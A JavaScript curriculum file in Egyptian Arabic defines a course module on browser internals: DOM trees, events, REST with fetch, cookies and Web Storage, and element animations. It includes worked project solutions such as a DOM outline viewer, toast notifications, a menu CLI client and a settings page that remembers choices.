// تكملة تاب js: الأقسام دي بتتضاف للتاب اللي اتعرّف في js/tabs/js/01.js (شرح حقول الدرس في أوله)
MORE("js", [
    {
      t: R`المتصفح بعمق: شجرة الـ DOM و window والأحداث والتخزين و REST`,
      l: 2,
      time: R`حوالي ٨ ساعات`,
      n: R`انت بتعرف تجيب عنصر وتسمع على ضغطة وتعمل [[fetch]]. الوحدة دي بتوريك المتصفح نفسه من جوه: التلات objects اللي JavaScript بيشوف بيهم التاب والمتصفح والصفحة، والشجرة وإزاي تتمشى فيها وتنقل عناصرها، والطرق التلاتة تربط بيها حدث وليه واحدة منهم ممنوعة في المواقع الجادة، وإزاي الـ async كان شغال قبل Promise. وبعدين تكلّم API حقيقي بالـ ٥ methods، وتخزّن في الأماكن الأربعة وتعرف مين لإيه (ومين بيستخدمها يتتبعك)، وتحرّك العناصر من JS. وكل ده في مشروع ملاحظات كامل: سيرفر REST وصفحة وتخزين واختبارات`,
      pre: [
        { to: "js/querySelector", why: R`تجيب عنصر، ونقطة البداية لأي مشي في الشجرة` },
        { to: "js/addEventListener", why: R`أول طريقة تسمع بيها على حدث، وهنا الطريقتين التانيين والـ options` },
        { to: "js/fetch و AbortController", why: R`[[fetch]] و [[res.ok]] والإلغاء، وهنا [[PUT]] و [[PATCH]] و [[DELETE]] والـ blobs` },
        { to: "js/async و await", why: R`كل حاجة في الوحدة بتستنى: ملفات وشبكة وتخزين وanimations` },
        { to: "js/event delegation", why: R`[[closest]] و listener واحد على الأب، في كل مشروع هنا` },
      ],
      goal: [
        R`تعرف مين مسؤول عن إيه بين [[window]] و [[navigator]] و [[document]]، وتتمشى في شجرة الـ DOM وتنقل وتنسخ عناصرها من غير ما تقع في عقد النص.`,
        R`تربط الأحداث بالطريقة الصح وتشيلها بـ [[signal]]، وتحوّل [[onclick="..."]] قبل ما الـ CSP يكسرها، وتلف أي callback قديم في Promise.`,
        R`تكتب client لـ REST API بالـ ٥ methods وتتعامل مع ١٢ status code، وتجيب نص وصور مش JSON بس، وتكتب API صغير بـ [[node:http]] وتختبره بـ [[node --test]].`,
        R`تختار بين الكوكيز و Web Storage و Cache و IndexedDB بالأرقام، وتكتب كوكيز صح من JS، وتعرف إزاي التخزين بيتستخدم في التتبع.`,
        R`تحرّك العناصر بـ [[element.animate]] وتستنى نهايتها، وتحترم [[prefers-reduced-motion]].`,
      ],
      use: {
        prog: R`كل صفحة فيها لستة بتتعدّل، وفورم بيتحفظ، وحالة بتعيش بعد الـ reload، وطلبات لـ API، وحركة بسيطة. والباجات المشهورة هنا: [[nextSibling]] نص، و [[removeEventListener]] مبيشيلش، و [[onclick]] بيقع مع CSP، و [[JSON.parse]] على [["false"]]، وعربي في كوكي بيوصل بايظ.`,
        work: R`لوحات تحكم ومتاجر وتطبيقات داخلية: CRUD على API، ومسودات، وتفضيلات، وإشعارات. ومراجعة كود حد تاني: توكن في [[localStorage]]، أو [[POST]] بيتعاد لوحده، أو inline handlers في موقع عليه CSP.`,
        cs: R`الشجرة (tree) وطرق المشي فيها، و REST كأسلوب تصميم (Roy Fielding)، و idempotency في الأنظمة الموزعة، و optimistic concurrency بالـ version (الـ 409 في مشروع الملاحظات)، والخصوصية والتتبع.`,
      },
      projects: [
        { lvl: 'صغير', dir: "dom-outline", t: R`شجرة الصفحة كنص`, what: R`صفحة فيها منيو كافيه متداخل (عنوان، ولستة جواها لستة، وتعليق HTML)، وتحتها [[<pre>]] بيرسم شجرة المنيو بالخطوط ([[├─]] و [[└─]]) بدالة recursive، و checkbox «اعرض الـ text nodes والتعليقات» بيبدّل بين [[children]] و [[childNodes]]، وتحت الشجرة العدد. ولما تدوس على أي عنصر في المنيو يتعلّم عليه ويتكتب: اسمه، وأبوه، وعدد إخواته وأولاده، وأقرب [[li]] ليه بـ [[closest]]. من درس «شجرة الـ DOM».`, done: R`الشجرة من غير النصوص فيها ٧ عناصر تحت الـ [[nav]]، ومع النصوص ٢٠ عقدة وباين فيها [[\n]] والتعليق، والضغط على «شاي» بيكتب «الأب: ul | إخواته: 1 | أقرب li: شاي»، وعلى العنوان «أقرب li: مفيش».`, sol: R`## الشكل النهائي

~~~live 560 index.html
<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>شجرة الصفحة</title>
<style>
  body { font: 15px/1.6 system-ui, sans-serif; margin: 16px; }
  #sample { border: 1px dashed #999; padding: 8px 12px; border-radius: 6px; }
  pre { direction: ltr; text-align: left; background: #f3f4f6; padding: 10px; border-radius: 6px; overflow-x: auto; font-size: 13px; }
  .picked { outline: 2px solid #0b6e4f; }
</style>
</head>
<body>
<nav id="sample" aria-label="منيو الكافيه">
  <h2>المنيو</h2>
  <ul>
    <li>مشروبات سخنة
      <ul><li>قهوة</li><li>شاي</li></ul>
    </li>
    <li>حلويات <!-- قريب: تشيز كيك --></li>
  </ul>
</nav>
<p>
  <label><input type="checkbox" id="text"> اعرض الـ text nodes والتعليقات</label>
</p>
<p id="info">دوس على أي عنصر في المنيو تشوف أهله وإخواته.</p>
<pre id="out"></pre>
<script>
const sample = document.querySelector("#sample");
const out = document.querySelector("#out");
const info = document.querySelector("#info");

// اسم العقدة في سطر: العناصر باسمها، والنص بين علامات تنصيص، والتعليق بـ <!-- -->
function label(node) {
  if (node.nodeType === Node.ELEMENT_NODE) return node.localName + (node.id ? "#" + node.id : "");
  if (node.nodeType === Node.TEXT_NODE) return JSON.stringify(node.nodeValue);
  if (node.nodeType === Node.COMMENT_NODE) return "<!--" + node.nodeValue + "-->";
  return node.nodeName;
}

// بنمشي الشجرة بالـ recursion: كل عقدة سطر، وأولادها تحتها بمسافة أكبر
function outline(node, withText, prefix = "", last = true, lines = []) {
  lines.push(prefix + (prefix ? (last ? "└─ " : "├─ ") : "") + label(node));
  const kids = [...(withText ? node.childNodes : node.children)];
  kids.forEach((kid, i) => outline(kid, withText, prefix + (prefix ? (last ? "   " : "│  ") : " "), i === kids.length - 1, lines));
  return lines;
}

function draw() {
  const withText = document.querySelector("#text").checked;
  const lines = outline(sample, withText);
  out.textContent = lines.join("\n") + "\n\n" + (lines.length - 1) + (withText ? " عقدة" : " عنصر") + " تحت الـ nav";
}

sample.addEventListener("click", e => {
  const el = e.target;
  sample.querySelector(".picked")?.classList.remove("picked");
  el.classList.add("picked");
  const parts = [
    "العنصر: " + el.localName,
    "الأب: " + (el === sample ? "body" : el.parentElement.localName),
    "إخواته: " + (el.parentElement ? el.parentElement.children.length - 1 : 0),
    "أولاده: " + el.children.length,
    "أقرب li: " + (el.closest("li")?.firstChild.nodeValue.trim() || "مفيش"),
  ];
  info.textContent = parts.join(" | ");
});
document.querySelector("#text").addEventListener("change", draw);
draw();
</script>
</body>
</html>
~~~

## هتشوف إيه

فوق المنيو نفسه بإطار متقطع، وتحته الشجرة بالإنجليزي من الشمال لليمين (أسامي التاجز)، والرقم. علّم على الـ checkbox: الشجرة بتطول لـ ٢٠ عقدة وتبان المسافات والسطور الجديدة كنصوص [["\n  "]]، والتعليق [[<!-- قريب: تشيز كيك -->]]. دوس على «شاي»: يتحط حواليه إطار أخضر والسطر يتغيّر.

~~~text الناتج (Chrome 157، Playwright)
nav#sample
 ├─ h2
 └─ ul
    ├─ li
    │  └─ ul
    │     ├─ li
    │     └─ li
    └─ li

7 عنصر تحت الـ nav

(مع الـ checkbox: 20 عقدة تحت الـ nav)
ضغطة على «شاي»:  العنصر: li | الأب: ul | إخواته: 1 | أولاده: 0 | أقرب li: شاي
ضغطة على العنوان: العنصر: h2 | الأب: nav | إخواته: 1 | أولاده: 0 | أقرب li: مفيش
~~~

## كل حتة بتعمل إيه

- **[[label(node)]]:** بتفرق بالـ [[nodeType]]: العنصر باسمه ([[localName]]) والـ id، والنص بـ [[JSON.stringify]] عشان الـ [[\n]] والمسافات تبان، والتعليق بين [[<!--]] و [[-->]].
- **[[outline(node, withText, prefix, last, lines)]]:** recursive. كل نداء بيكتب سطر العقدة، وبعدين بينادي نفسه على كل ابن ومعاه [[prefix]] أطول: [["│  "]] لو فيه إخوات تحت، و [["   "]] لو ده آخر واحد. ده اللي بيرسم الخطوط مظبوطة.
- **[[withText ? node.childNodes : node.children]]:** السطر اللي بيفرق بين الشجرتين. نفس الدالة، والفرق كله في المصدر.
- **[[[...]]] قبل [[forEach]]:** [[children]] (HTMLCollection) مالهاش [[forEach]]، فحوّلناها array.
- **الضغطة:** listener واحد على الـ [[nav]]، و [[e.target]] هو العنصر اللي اتداس عليه بالظبط. [[el.closest("li")?.firstChild.nodeValue]] بيطلع لأقرب [[li]] وياخد النص اللي في أوله (الـ [[?.]] عشان العنوان مالوش [[li]]).

## فخاخ اتعمل حسابها في الكود

- **[[el === sample ? "body" : ...]]:** الضغطة على الـ [[nav]] نفسه (في المسافة بين العناصر) بتخلي [[e.target]] هو الـ [[nav]]، وأبوه [[body]].
- **[[.trim()]] على «أقرب li»:** الـ [[li]] الكبير «مشروبات سخنة» أول عقدة فيه نص بعده سطر جديد ومسافات (باين في الشجرة بالـ checkbox).

## اتقاس

- Playwright في Chrome 157: العدّين (٧ و ٢٠) والسطرين اللي فوق، ومفيش ولا [[pageerror]].
- على عرض ٣٦٠: [[scrollWidth]] طلع ٣٤٥ مش ٣٦٠، لأن الـ scrollbar الرأسي واخد ١٥px. يعني مفيش scroll أفقي، والـ [[pre]] عليه [[overflow-x: auto]] فالشجرة لو طولت بتعمل scroll جوه نفسها.
- في الـ preview الحي في الموقع ده: شغالة كلها (مفيش تخزين ولا شبكة).` },
        { lvl: 'صغير', dir: "toast-stack", t: R`إشعارات بتدخل وتخرج بـ animate`, what: R`زرارين «اتحفظ» و «فشل»، وكل ضغطة بتطلّع إشعار تحت في الركن: بيدخل من تحت بـ [[element.animate]]، وبيختفي لوحده بعد ٣ ثواني (الخطأ ٥)، وتحته خط بيقصر مع الوقت. لو الماوس وقف على الإشعار الوقت بيقف، وزرار × بيقفله. الخروج animation وبعد [[await anim.finished]] العنصر يتمسح. ومع [[prefers-reduced-motion]] الدخول والخروج fade بس من غير حركة. من درسي «Web Animations API» و «event handlers».`, done: R`٣ ضغطات = ٣ إشعارات، والماوس على إشعار الخطأ بيخليه يفضل والتانيين يختفوا، و × بيمسحه وسطر «فاضل 0 إشعار» بيظهر، ومع reduce الـ keyframes من غير [[transform]].`, sol: R`## الشكل النهائي

~~~live 300 index.html
<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>إشعارات</title>
<style>
  body { font: 16px/1.6 system-ui, sans-serif; margin: 16px; min-height: 260px; }
  button { font: inherit; padding: 6px 14px; border-radius: 6px; border: 1px solid #ccc; background: #f3f4f6; cursor: pointer; }
  #toasts { position: fixed; inset-block-end: 12px; inset-inline-start: 12px; display: grid; gap: 8px; width: min(320px, calc(100% - 24px)); margin: 0; padding: 0; list-style: none; }
  .toast { display: flex; justify-content: space-between; align-items: center; gap: 8px; padding: 10px 12px; border-radius: 8px; color: #fff; box-shadow: 0 4px 12px #0003; }
  .toast.ok { background: #0b6e4f; }
  .toast.err { background: #b42318; }
  .toast button { background: transparent; color: inherit; border-color: #fff8; padding: 0 8px; }
</style>
</head>
<body>
<p>
  <button id="ok" type="button">اتحفظ</button>
  <button id="err" type="button">فشل</button>
</p>
<p id="log" aria-live="polite"></p>
<ul id="toasts" aria-live="polite"></ul>
<script>
const list = document.querySelector("#toasts");
const log = document.querySelector("#log");
const calm = matchMedia("(prefers-reduced-motion: reduce)");

// الدخول: من تحت وبيظهر. ولو اليوزر طالب حركة أقل: ظهور بس
const enter = () => calm.matches
  ? [{ opacity: 0 }, { opacity: 1 }]
  : [{ opacity: 0, transform: "translateY(16px) scale(.96)" }, { opacity: 1, transform: "none" }];

function toast(text, kind = "ok", ms = 3000) {
  const li = document.createElement("li");
  li.className = "toast " + kind;
  const span = document.createElement("span");
  span.textContent = text;
  const close = document.createElement("button");
  close.type = "button";
  close.textContent = "×";
  close.setAttribute("aria-label", "اقفل الإشعار");
  li.append(span, close);
  list.append(li);
  li.animate(enter(), { duration: 250, easing: "ease-out" });

  // شريط الوقت: animation تانية بنوقفها لما الماوس يقف على الإشعار
  const timer = li.animate([{ boxShadow: "inset 0 -3px 0 #fff8" }, { boxShadow: "inset 0 -3px 0 #fff0" }], { duration: ms });
  li.addEventListener("pointerenter", () => timer.pause());
  li.addEventListener("pointerleave", () => timer.play());
  timer.finished.then(() => dismiss(li)).catch(() => {}); // cancel() بيرفض الـ promise بـ AbortError
  close.addEventListener("click", () => { timer.cancel(); dismiss(li); }, { once: true });
}

async function dismiss(li) {
  if (li.dataset.leaving) return;
  li.dataset.leaving = "1";
  const out = li.animate([{ opacity: 1 }, { opacity: 0, transform: calm.matches ? "none" : "translateX(-24px)" }], { duration: 200, fill: "forwards" });
  await out.finished;
  li.remove();
  log.textContent = "فاضل " + list.children.length + " إشعار";
}

document.querySelector("#ok").addEventListener("click", () => toast("الملاحظة اتحفظت", "ok"));
document.querySelector("#err").addEventListener("click", () => toast("الشبكة فصلت، جرّب تاني", "err", 5000));
</script>
</body>
</html>
~~~

## هتشوف إيه

دوس «اتحفظ» كذا مرة: كل إشعار أخضر بيطلع من تحت فوق اللي قبله، وتحته خط أبيض خفيف بيختفي، وبعد ٣ ثواني بيتسحب لليسار ويختفي، والسطر فوق بيقول فاضل كام. «فشل» أحمر وبيقعد ٥ ثواني. حط الماوس على أي واحد: الوقت بيقف لحد ما تشيله.

~~~text الناتج (Chrome 157، Playwright)
٣ ضغطات:                         3 إشعارات
الماوس على الأحمر ٣٫٤ ثانية:      فاضل الأحمر بس، السطر: «فاضل 1 إشعار»
× على الأحمر:                     0 إشعارات، السطر: «فاضل 0 إشعار»
reducedMotion = "reduce":          keyframes الدخول: ["no-transform","no-transform"]
~~~

## كل حتة بتعمل إيه

- **[[li.animate(enter(), { duration: 250 })]]:** الدخول. [[enter()]] دالة مش ثابت عشان تقرا [[calm.matches]] كل مرة: لو اليوزر غيّر الإعداد والصفحة مفتوحة، الإشعار الجاي يحترمه.
- **التايمر animation:** بدل [[setTimeout]]، الإشعار عليه animation تانية مدتها [[ms]] (الخط اللي تحت). [[timer.pause()]] مع [[pointerenter]] و [[timer.play()]] مع [[pointerleave]] بيوقفوا الوقت نفسه، و [[timer.finished.then(() => dismiss(li))]] بيقفل لما الوقت يخلص. كده الوقف والكمّل ببلاش: مفيش حساب «فاضل كام ms».
- **[[.catch(() => {})]] على [[timer.finished]]:** زرار × بيعمل [[timer.cancel()]]، والـ cancel بيرفض الـ Promise بـ [[AbortError]]. من غير الـ catch هيطلع «Uncaught (in promise)».
- **[[dismiss(li)]]:** [[li.dataset.leaving]] بيمنع إنه يتقفل مرتين (التايمر وزرار × في نفس اللحظة)، و [[fill: "forwards"]] بيخليه مختفي لحد ما [[await out.finished]] ثم [[li.remove()]].
- **[[{ once: true }]]** على زرار ×: ضغطتين سريعين مش هيندهوا [[dismiss]] مرتين.
- **[[aria-live="polite"]]** على اللستة: قارئ الشاشة بيقول الإشعار الجديد.

## ليه animation للوقت مش [[setTimeout]]

بـ [[setTimeout(() => dismiss(li), ms)]] الوقف بالماوس محتاج [[clearTimeout]] وتحسب الوقت الفاضل بـ [[Date.now()]] وتبدأ تايمر جديد. الـ animation بتعمل ده في سطرين ([[pause]] و [[play]])، وبتعرض الوقت الفاضل كمان.

## اللي ظهر في القياس

**في Playwright المدد كانت أطول بكتير من المكتوب:** قسنا animation مدتها ٢٠٠ms خدت ١٠١٦ms، و ١٠ [[requestAnimationFrame]] خدوا ٩١٤٩ms (حوالي frame في الثانية)، مع إن [[document.visibilityState]] = [["visible"]]. شباك المتصفح كان مستخبي ورا شبابيك تانية، فـ Chrome بطّأ الـ frames. الحالات والترتيب صح، بس الوقت بالملي ثانية مبيتقاسش كده: قيسه في شباك ظاهر، أو اعتمد على [[finished]] مش على الساعة.

## اتقاس

- Playwright في Chrome 157: العدد والسطر بعد كل خطوة، والـ keyframes مع [[emulateMedia({ reducedMotion: "reduce" })]]، ومفيش [[pageerror]].
- في الـ preview الحي في الموقع ده: [[element.animate]] شغال جوه الـ sandbox، وضغطة «اتحفظ» طلّعت إشعار.` },
        { lvl: 'متوسط', t: R`أداة سطر أوامر للمنيو`, what: R`[[menu.js]] بتكلّم الـ REST API بتاع درس «REST و CRUD بـ fetch»: [[node menu.js list]] بيطبع جدول (id واسم وسعر)، و [[add <name> <price>]] و [[price <id> <price>]] و [[rename <id> <name>]] (بـ [[PATCH]])، و [[rm <id>]]. كل خطأ بيتكتب برسالة السيرفر نفسها وبالـ status، والبرنامج بيخرج بـ exit code [[1]]. والسيرفر واقف = رسالة واضحة مش stack trace، وطلب بيعلق أكتر من ٥ ثواني بيتلغي بـ [[AbortSignal.timeout]].`, done: R`كل أمر صح بيطبع النتيجة و exit [[0]]، و [[add قهوة 45]] بيطبع «409: الصنف ده موجود»، و [[add موكا]] (من غير سعر) بيطبع «السعر لازم رقم» من غير ما يكلّم السيرفر، و [[rm 3]] مرتين = ٠ ثم ١، والسيرفر واقف = «مش قادر أوصل للسيرفر (ECONNREFUSED)».`, sol: R`## الشكل النهائي

~~~text الناتج: السيرفر واقف، وبعدين node server.js في ترمنال تاني (Git Bash، Node 24.22)
$ node menu.js list
خطأ: مش قادر أوصل للسيرفر (ECONNREFUSED)
(exit 1)
$ node menu.js list
  1  قهوة        45.00 ج.م
  2  شاي         20.00 ج.م
(exit 0)
$ node menu.js add لاتيه 60
اتضاف:   3  لاتيه       60.00 ج.م
(exit 0)
$ node menu.js add قهوة 45
خطأ: 409: الصنف ده موجود
(exit 1)
$ node menu.js add موكا
خطأ: السعر لازم رقم
(exit 1)
$ node menu.js price 3 65
اتعدل:   3  لاتيه       65.00 ج.م
(exit 0)
$ node menu.js rename 3 فلات_وايت
اتعدل:   3  فلات_وايت   65.00 ج.م
(exit 0)
$ node menu.js price 9 10
خطأ: 404: الصنف 9 مش موجود
(exit 1)
$ node menu.js rm 3
اتمسح 3
(exit 0)
$ node menu.js rm 3
خطأ: 404: الصنف 3 مش موجود
(exit 1)
$ node menu.js fly
خطأ: الاستخدام: node menu.js list | add <name> <price> | price <id> <price> | rename <id> <name> | rm <id>
(exit 1)
~~~

## الكود

الملف ده جنب [[server.js]] بتاع الدرس (اللي بيشتغل على بورت ٣٠٠٠):

~~~js menu.js
// menu.js: أداة سطر أوامر بتكلّم الـ REST API بتاع المنيو
// node menu.js list | add <name> <price> | price <id> <price> | rename <id> <name> | rm <id>
const API = process.env.MENU_API || "http://localhost:3000/api/items";

async function call(method, path = "", body) {
  let res;
  try {
    res = await fetch(API + path, {
      method,
      headers: body ? { "Content-Type": "application/json" } : {},
      body: body && JSON.stringify(body),
      signal: AbortSignal.timeout(5000),
    });
  } catch (err) {
    const why = err.name === "TimeoutError" ? "السيرفر مردّش في ٥ ثواني" : "مش قادر أوصل للسيرفر (" + (err.cause?.code || err.message) + ")";
    throw new Error(why);
  }
  const data = res.status === 204 ? null : await res.json().catch(() => null);
  if (!res.ok) throw new Error(res.status + ": " + (data?.error || res.statusText));
  return data;
}

const money = n => n.toFixed(2) + " ج.م";
const row = i => String(i.id).padStart(3) + "  " + i.name.padEnd(12) + money(i.price);

function needNumber(value, what) {
  const n = Number(value);
  if (value === undefined || !Number.isFinite(n)) throw new Error(what + " لازم رقم");
  return n;
}

async function main([cmd, a, b]) {
  switch (cmd) {
    case "list": {
      const items = await call("GET");
      if (!items.length) return console.log("المنيو فاضي");
      return console.log(items.map(row).join("\n"));
    }
    case "add": {
      const item = await call("POST", "", { name: a ?? "", price: needNumber(b, "السعر") });
      return console.log("اتضاف:", row(item));
    }
    case "price":
      return console.log("اتعدل:", row(await call("PATCH", "/" + needNumber(a, "الـ id"), { price: needNumber(b, "السعر") })));
    case "rename":
      return console.log("اتعدل:", row(await call("PATCH", "/" + needNumber(a, "الـ id"), { name: b ?? "" })));
    case "rm":
      await call("DELETE", "/" + needNumber(a, "الـ id"));
      return console.log("اتمسح", a);
    default:
      throw new Error("الاستخدام: node menu.js list | add <name> <price> | price <id> <price> | rename <id> <name> | rm <id>");
  }
}

main(process.argv.slice(2)).catch(err => {
  console.error("خطأ:", err.message);
  process.exitCode = 1;
});
~~~

## كل حتة بتعمل إيه

- **[[call(method, path, body)]]:** المكان الوحيد اللي فيه [[fetch]]. بيحوّل أي حاجة غلط لـ [[Error]] برسالة واحدة: الشبكة («مش قادر أوصل»)، والمهلة، والـ status اللي مش ok برسالة السيرفر. فـ [[main]] مبيعرفش حاجة عن HTTP.
- **[[err.cause?.code]]:** [[fetch]] في Node بيرمي [[TypeError: fetch failed]] والسبب الحقيقي ([[ECONNREFUSED]] أو [[ENOTFOUND]]) جوه [[cause]].
- **[[AbortSignal.timeout(5000)]]:** لو السيرفر علّق، الطلب بيتلغي بـ [[TimeoutError]] بدل ما الأداة تفضل مستنية (درس «fetch و AbortController»).
- **[[needNumber]] قبل الطلب:** «موكا» من غير سعر اتمسكت في الـ client، فمفيش طلب راح أصلًا. والسيرفر بيفحص تاني (أي client تاني ممكن يبعت أي حاجة).
- **[[price]] و [[rename]] بـ [[PATCH]]** بالحقل اللي اتغيّر بس، مش [[PUT]] بالصنف كله: مش محتاجين نجيب الصنف الأول.
- **[[process.exitCode = 1]]** مش [[process.exit(1)]]: البرنامج بيخلص طبيعي (الـ output يتطبع كله) ويرجّع ١، فسكربت bash يقدر يعمل [[node menu.js add ... || echo فشل]].
- **[[MENU_API]] من الـ environment:** نفس الأداة تكلّم سيرفر تاني من غير تعديل.

## الغلطة اللي حصلت

**أول نسخة كانت بتكتب السعر بـ [[Intl.NumberFormat("ar-EG", { style: "currency", currency: "EGP" })]]:** الناتج طلع «٤٥٫٠٠ ج.م.» بأرقام عربي وحوالين الرقم حروف مخفية (علامات اتجاه RLM ومسافة NBSP، درس «Intl: الـ locale والتفاوض»)، فاللي ينسخ الناتج أو يعمل عليه [[grep "45"]] مش هيلاقي حاجة، والفاحص بتاع الموقع ده نفسه بيرفض الحروف المخفية دي في الدروس. رجعنا لـ [[toFixed(2) + " ج.م"]]: أداة ترمنال الناتج بتاعها المفروض يتقري ويتفلتر.

## اتقاس

كل الأوامر اللي فوق اتشغّلت بالترتيب ده على Node 24.22 (Git Bash على ويندوز)، والـ exit code بعد كل واحد من [[$?]].` },
        { lvl: 'متوسط', dir: "settings-panel", t: R`صفحة إعدادات بتفتكر في ٣ أماكن`, what: R`صفحة إعدادات فيها: الثيم (فاتح/غامق) في **كوكي** لسنة، وحجم الخط (١٤ لـ ٢٢) في **[[localStorage]]**، وآخر تبويب فتحته في **[[sessionStorage]]**. كل إعداد بيتطبّق على طول، وبيرجع بعد الـ reload، وحجم الخط بيتغيّر في التابات التانية المفتوحة من غير reload (الحدث [[storage]]). ولو التخزين ممنوع (sandbox أو إعدادات المتصفح) الصفحة بتشتغل من الذاكرة وبتقول لليوزر «الإعدادات هتتنسي مع الـ reload» بدل ما تقع. وقيمة بايظة محفوظة (حجم ٩٩٩) بترجع للافتراضي. من دروس «Web Storage» و «document.cookie» و «تختار تخزين إيه».`, done: R`بعد ما تختار غامق و ٢٠px والخصوصية: الكوكي [[theme=dark]]، و [[font-size]] = [["20"]]، و [[tab]] = [["privacy"]]. تاب جديد: غامق و ٢٠px بس التبويب «الحساب». تغيير الحجم لـ ١٤ في تاب = ١٤ في التاني على طول. reload لنفس التاب = «الخصوصية». و [[localStorage]] فيها ٩٩٩ = ١٦px. وفي الـ preview الحي: الرسالة الصفرا ظاهرة والإعدادات شغالة.`, sol: R`## الشكل النهائي

~~~live 420 index.html
<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>الإعدادات</title>
<style>
  :root { --bg: #fff; --fg: #1b1b1b; --card: #f3f4f6; --size: 16px; }
  :root[data-theme="dark"] { --bg: #111418; --fg: #e8eaed; --card: #1d2228; }
  body { margin: 16px; font: var(--size)/1.6 system-ui, sans-serif; background: var(--bg); color: var(--fg); }
  fieldset { border: 1px solid #8884; border-radius: 8px; margin-block: 10px; background: var(--card); }
  .note { font-size: 14px; padding: 8px 10px; border-radius: 6px; background: #fff3cd; color: #5c4500; }
  [role="tablist"] button[aria-selected="true"] { font-weight: 700; text-decoration: underline; }
</style>
</head>
<body>
<h1>الإعدادات</h1>
<p id="where" class="note" hidden></p>
<fieldset>
  <legend>الثيم (كوكي سنة)</legend>
  <label><input type="radio" name="theme" value="light"> فاتح</label>
  <label><input type="radio" name="theme" value="dark"> غامق</label>
</fieldset>
<fieldset>
  <legend>حجم الخط (localStorage)</legend>
  <input type="range" id="size" min="14" max="22" step="2" aria-label="حجم الخط"> <output id="size-out"></output>
</fieldset>
<fieldset>
  <legend>آخر تاب فتحته (sessionStorage)</legend>
  <div role="tablist">
    <button type="button" role="tab" data-tab="account">الحساب</button>
    <button type="button" role="tab" data-tab="privacy">الخصوصية</button>
  </div>
  <p id="panel"></p>
</fieldset>
<script>
// كل نوع تخزين وراه احتياطي في الذاكرة، عشان الصفحة تشتغل حتى لو التخزين ممنوع
function safeStorage(kind) {
  try {
    const s = window[kind];
    const probe = "__probe__";
    s.setItem(probe, probe);
    s.removeItem(probe);
    return { ok: true, get: k => s.getItem(k), set: (k, v) => s.setItem(k, v) };
  } catch (err) {
    const mem = new Map();
    return { ok: false, why: err.name, get: k => mem.get(k) ?? null, set: (k, v) => mem.set(k, String(v)) };
  }
}
const local = safeStorage("localStorage");
const session = safeStorage("sessionStorage");

const cookies = {
  get(name) {
    try {
      const pair = document.cookie.split("; ").find(c => c.startsWith(name + "="));
      return pair ? decodeURIComponent(pair.slice(name.length + 1)) : null;
    } catch { return null; }
  },
  set(name, value, days) {
    try { document.cookie = name + "=" + encodeURIComponent(value) + "; max-age=" + days * 86400 + "; path=/; SameSite=Lax"; return true; }
    catch { return false; }
  },
};

const blocked = [!local.ok && "localStorage", !session.ok && "sessionStorage", cookies.set("probe", "1", 0) || "الكوكيز"].filter(x => typeof x === "string");
if (blocked.length) {
  const where = document.querySelector("#where");
  where.hidden = false;
  where.textContent = "التخزين مقفول هنا (" + blocked.join(" و ") + ")، فالإعدادات هتتنسي مع الـ reload. الصفحة شغالة عادي.";
}

// الثيم
function applyTheme(theme) {
  document.documentElement.dataset.theme = theme;
  document.querySelector('[name="theme"][value="' + theme + '"]').checked = true;
}
applyTheme(cookies.get("theme") === "dark" ? "dark" : "light");
for (const r of document.querySelectorAll('[name="theme"]')) {
  r.addEventListener("change", () => { applyTheme(r.value); cookies.set("theme", r.value, 365); });
}

// حجم الخط
const size = document.querySelector("#size");
function applySize(px) {
  const n = [14, 16, 18, 20, 22].includes(Number(px)) ? Number(px) : 16;
  document.documentElement.style.setProperty("--size", n + "px");
  size.value = n;
  document.querySelector("#size-out").textContent = n + "px";
}
applySize(local.get("font-size"));
size.addEventListener("input", () => { applySize(size.value); local.set("font-size", size.value); });

// تاب تاني غيّر الحجم؟ نطبّقه هنا من غير reload
addEventListener("storage", e => { if (e.key === "font-size") applySize(e.newValue); });

// آخر تاب
const TEXT = { account: "اسمك وإيميلك.", privacy: "مين يشوف ملاحظاتك." };
function openTab(name) {
  if (!TEXT[name]) name = "account";
  for (const b of document.querySelectorAll("[data-tab]")) b.setAttribute("aria-selected", String(b.dataset.tab === name));
  document.querySelector("#panel").textContent = TEXT[name];
  session.set("tab", name);
}
document.querySelector("[role=tablist]").addEventListener("click", e => {
  const b = e.target.closest("[data-tab]");
  if (b) openTab(b.dataset.tab);
});
openTab(session.get("tab"));
</script>
</body>
</html>
~~~

## هتشوف إيه

في الـ preview اللي فوق **هتشوف رسالة صفرا**: «التخزين مقفول هنا (localStorage و sessionStorage و الكوكيز)…». ده مقصود ومهم: الـ preview الحي في الموقع ده [[iframe]] عليه [[sandbox]] من غير [[allow-same-origin]]، فالتلات أماكن بيرموا [[SecurityError]]، والصفحة كمّلت من الذاكرة: اختار «غامق» وحرّك الحجم وهتلاقيهم شغالين، بس الـ reload بينساهم. انسخ الملف وشغّله من سيرفر محلي والرسالة هتختفي.

~~~text الناتج (Chrome 157 من سيرفر محلي، Playwright، تابين)
البداية:              theme light | 16px | «اسمك وإيميلك.» | الرسالة الصفرا مستخبية
بعد الاختيارات:        cookie=theme=dark | local=20 | session=privacy
تاب جديد:              theme dark | 20px | «اسمك وإيميلك.»
الحجم ١٤ في الأول:      التاني بقى 14px (computed font-size: 14px)
reload لنفس التاب:     «مين يشوف ملاحظاتك.»
font-size = "999":     16px
~~~

~~~text الناتج (نفس الملف جوه الـ preview الحي في الموقع، Chrome 157)
التخزين مقفول هنا (localStorage و sessionStorage و الكوكيز)، فالإعدادات هتتنسي مع الـ reload. الصفحة شغالة عادي.
اختيار «غامق» ← data-theme = dark
~~~

## كل حتة بتعمل إيه

- **[[safeStorage(kind)]]:** بتجرّب [[setItem]] و [[removeItem]] على مفتاح تجربة. لو نجحت بترجّع واجهة على التخزين الحقيقي، ولو رمت (حتى قراية [[window[kind]]] نفسها بترمي في الـ sandbox) بترجّع نفس الواجهة على [[Map]] في الذاكرة. باقي الكود مبيعرفش الفرق.
- **[[cookies.set]] في [[try]]:** [[document.cookie]] نفسها بترمي في الـ sandbox. و [[cookies.set("probe", "1", 0)]] بيجرّب الكتابة وبيمسح في نفس اللحظة ([[max-age=0]]).
- **[[encodeURIComponent]] و [[decodeURIComponent]]** في الكوكي حتى لو القيم إنجليزي النهارده.
